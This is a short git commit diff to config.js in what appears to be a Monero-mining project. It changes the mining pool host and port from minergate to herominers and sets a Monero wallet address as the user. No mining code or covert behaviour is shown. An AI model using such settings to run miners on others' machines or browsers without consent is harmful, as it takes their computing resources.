76934c420bb645ca5e4cb1a7083663eec7a2dc24
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2024-01-17 14:47:46 +0100

    Update config.js

--- config.js
+++ config.js
@@ -1,6 +1,6 @@
 module.exports = {
-	host: 'xmr.pool.minergate.com',
-	port: 45560,
-	user: 'email@hkalexling.com',
-	password: null
+	host: 'us.monero.herominers.com',
+	port: 1111,
+	user: '43KmowBoHqVZxaSP3CkPvsgi7W6kdVk7xB2FNUEQqzrvNnyWXGdt9Z86myrFc3VZZPGExWnqp7GTuR6yjuA1NX6yGaPRn9K',
+	password: 'worker1'
 };
